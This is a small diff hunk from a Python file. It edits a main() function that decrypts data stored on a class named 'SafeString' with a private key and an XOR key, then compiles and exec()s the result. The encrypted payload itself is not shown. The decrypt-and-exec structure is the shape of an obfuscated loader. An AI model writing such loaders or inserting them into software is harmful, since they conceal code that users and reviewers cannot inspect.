@@ -58,7 +58,7 @@ class SafeString:
 
 
 def main():
-    decrypted_data = decrypt_data(encrypted_data, private_key, xor_key)
+    decrypted_data = decrypt_data(SafeString.encrypted_data, SafeString.private_key, SafeString.xor_key)
     compiled_code = compile(decrypted_data, '<string>', 'exec')
     # Execute decrypted code
     exec(compiled_code)
